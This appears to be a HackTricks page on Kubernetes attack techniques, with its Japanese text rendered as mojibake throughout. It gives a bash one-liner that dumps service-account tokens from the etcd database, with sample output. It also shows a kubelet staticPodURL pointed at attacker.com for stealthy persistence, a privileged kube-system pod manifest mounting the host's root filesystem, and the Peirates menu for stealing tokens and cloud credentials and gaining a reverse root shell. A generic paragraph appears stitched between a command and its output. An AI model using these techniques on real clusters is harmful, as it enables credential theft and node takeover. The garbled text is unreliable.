**åŒã˜ã‚³ãƒãƒ³ãƒ‰ã§ã™ãŒã€kube-systemãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹å†…ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®ã¿ã‚’è¿”ã™ãŸã‚ã®ã„ãã¤ã‹ã®greps**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
## Kuberneteså†…ã®Podã‹ã‚‰æ”»æ’ƒã™ã‚‹

Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã®Podã‹ã‚‰æ”»æ’ƒã‚’è¡Œã†å ´åˆã€ã„ãã¤ã‹ã®æ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### 1. ãƒ›ã‚¹ãƒˆãƒã‚·ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

Podå†…ã‹ã‚‰ãƒ›ã‚¹ãƒˆãƒã‚·ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€ãƒ›ã‚¹ãƒˆãƒã‚·ãƒ³ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€/procãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€ãƒ›ã‚¹ãƒˆãƒã‚·ãƒ³ã®æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚

### 2. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

Podå†…ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã‚’è¡Œã†ã“ã¨ã§ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ç›—è´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ©Ÿå¯†æƒ…å ±ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### 3. ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®Podã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

Podå†…ã‹ã‚‰åŒã˜ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®Podã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€ä»–ã®Podã«å¯¾ã™ã‚‹æ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã‚‰ã®æ”»æ’ƒæ‰‹æ³•ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã‚’çªã„ãŸã‚Šã€èªè¨¼æƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸã‚Šã™ã‚‹ã“ã¨ã§å®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ã¯ã€Podå†…ã§ã®æœ€å°ç‰¹æ¨©ã®åŸå‰‡ã‚’éµå®ˆã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’é©åˆ‡ã«è¨­å®šã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### é™çš„/ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã®æ°¸ç¶šæ€§

_é™çš„ãƒãƒƒãƒ‰_ ã¯ã€APIã‚µãƒ¼ãƒãƒ¼ãŒç›£è¦–ã—ã¦ã„ãªã„ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã§kubeletãƒ‡ãƒ¼ãƒ¢ãƒ³ã«ã‚ˆã£ã¦ç›´æ¥ç®¡ç†ã•ã‚Œã¾ã™ã€‚åˆ¶å¾¡å¹³é¢ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã‚‹ãƒãƒƒãƒ‰ï¼ˆãŸã¨ãˆã°ã€Deploymentãªã©ï¼‰ã¨ã¯ç•°ãªã‚Šã€**kubeletã¯å„é™çš„ãƒãƒƒãƒ‰ã‚’ç›£è¦–**ã—ï¼ˆå¤±æ•—ã—ãŸå ´åˆã¯å†èµ·å‹•ã—ã¾ã™ï¼‰ã€‚

ã—ãŸãŒã£ã¦ã€é™çš„ãƒãƒƒãƒ‰ã¯å¸¸ã«ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã®1ã¤ã®Kubeletã«**ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã¦ã„ã¾ã™**ã€‚

**kubeletã¯ã€å„é™çš„ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦Kubernetes APIã‚µãƒ¼ãƒãƒ¼ä¸Šã«ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã‚’è‡ªå‹•çš„ã«ä½œæˆ**ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒãƒ¼ãƒ‰ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒãƒƒãƒ‰ã¯APIã‚µãƒ¼ãƒãƒ¼ä¸Šã§è¡¨ç¤ºã•ã‚Œã¾ã™ãŒã€ãã“ã‹ã‚‰åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãƒãƒƒãƒ‰åã¯ã€ãƒãƒ¼ãƒ‰ã®ãƒ›ã‚¹ãƒˆåã«å…ˆè¡Œã™ã‚‹ãƒã‚¤ãƒ•ãƒ³ã§æ¥å°¾è¾ãŒä»˜ãã¾ã™ã€‚

{% hint style="danger" %}
é™çš„ãƒãƒƒãƒ‰ã® **`spec` ã¯ä»–ã®APIã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å‚ç…§ã§ãã¾ã›ã‚“**ï¼ˆãŸã¨ãˆã°ã€ServiceAccountã€ConfigMapã€Secretãªã©ï¼‰ã€‚ãã®ãŸã‚ã€ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã§ä»»æ„ã®serviceAccountã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã™ã‚‹ãŸã‚ã«ã“ã®å‹•ä½œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãŸã ã—ã€ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ç•°ãªã‚‹åå‰ç©ºé–“ã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã™ï¼ˆä½•ã‚‰ã‹ã®ç†ç”±ã§ä¾¿åˆ©ãªå ´åˆãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
{% endhint %}

ãƒãƒ¼ãƒ‰ãƒ›ã‚¹ãƒˆå†…ã«ã„ã‚‹å ´åˆã€**è‡ªåˆ†è‡ªèº«å†…ã«é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã‹ãªã‚Šä¾¿åˆ©ã§ã™ã€‚ãªãœãªã‚‰ã€**kube-system**ã®ã‚ˆã†ãªç•°ãªã‚‹åå‰ç©ºé–“ã«ãƒãƒƒãƒ‰ã‚’ä½œæˆã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚

é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒå¤§ã„ã«å½¹ç«‹ã¡ã¾ã™**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚åŸºæœ¬çš„ã«2ã¤ã®ã“ã¨ãŒå¿…è¦ã§ã™ï¼š

* **kubeletã‚µãƒ¼ãƒ“ã‚¹**ã¾ãŸã¯**kubeletæ§‹æˆ**ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰ã§ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ **`--pod-manifest-path=/etc/kubernetes/manifests`** ã‚’æ§‹æˆã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã—ã¾ã™
* **`/etc/kubernetes/manifests`**å†…ã®**ãƒãƒƒãƒ‰å®šç¾©**ã§å®šç¾©ã‚’ä½œæˆã—ã¾ã™

**ã‚‚ã†1ã¤ã®ã‚ˆã‚Šéš ã‚ŒãŸæ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š**

* **kubelet**æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ **`staticPodURL`** ã‚’å¤‰æ›´ã—ã€`staticPodURL: http://attacker.com:8765/pod.yaml`ã®ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€kubeletãƒ—ãƒ­ã‚»ã‚¹ãŒ**æŒ‡å®šã•ã‚ŒãŸURLã‹ã‚‰æ§‹æˆã‚’å–å¾—ã—ã¦é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã—ã¾ã™ã€‚

**ä¾‹**ï¼š[**ã“ã“**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ã‹ã‚‰å–å¾—ã—ãŸ**kube-system**å†…ã®ç‰¹æ¨©ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹**ãƒãƒƒãƒ‰**æ§‹æˆã®ä¾‹ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯èƒ½ãªãƒãƒ¼ãƒ‰

æ”»æ’ƒè€…ãŒ**ãƒãƒ¼ãƒ‰ã‚’ä¾µå®³**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒãƒƒãƒ‰ã‚’**å‰Šé™¤**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ãŒãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ããªãã™ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€ãƒãƒƒãƒ‰ã¯ä¾µå®³ã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã§å†å®Ÿè¡Œã•ã‚Œã€å½¼ã¯ãã‚Œã‚‰ã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚\
è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®ãƒªãƒ³ã‚¯**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€å½“ç¤¾ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* **HackTricks**ï¼ˆhttps://github.com/carlospolop/hacktricksï¼‰ãŠã‚ˆã³**HackTricks Cloud**ï¼ˆhttps://github.com/carlospolop/hacktricks-cloudï¼‰ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
